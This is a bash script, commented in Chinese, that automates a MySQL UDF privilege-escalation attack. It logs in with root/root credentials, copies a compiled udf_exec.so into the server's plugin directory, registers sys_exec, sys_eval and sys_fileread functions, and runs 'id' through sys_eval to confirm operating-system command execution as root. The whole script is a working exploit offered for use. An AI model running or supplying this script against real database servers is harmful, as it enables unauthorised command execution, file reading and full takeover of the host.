#!/bin/bash
# 一键: 上传 UDF 到 plugin 目录 + 注册函数 + 验证提权
cd "$(dirname "$0")"
if [ ! -f udf_exec.so ]; then
    bash compile.sh
fi
PLUGIN_DIR=$(mysql -uroot -proot -N -e "SHOW VARIABLES LIKE 'plugin_dir'" 2>/dev/null | awk '{print $2}')
if [ -z "$PLUGIN_DIR" ]; then
    echo "[-] 无法连接 MySQL (root/root)"
    exit 1
fi
echo "[*] plugin_dir = $PLUGIN_DIR"
cp -f udf_exec.so "$PLUGIN_DIR/"
echo "[*] 注册函数 ..."
mysql -uroot -proot -e "CREATE FUNCTION IF NOT EXISTS sys_exec RETURNS INTEGER SONAME 'udf_exec.so'; CREATE FUNCTION IF NOT EXISTS sys_eval RETURNS STRING SONAME 'udf_exec.so'; CREATE FUNCTION IF NOT EXISTS sys_fileread RETURNS STRING SONAME 'udf_exec.so';"
echo "[*] 验证命令执行 (mysqld 以 root 运行):"
mysql -uroot -proot -e "SELECT sys_eval('id');"
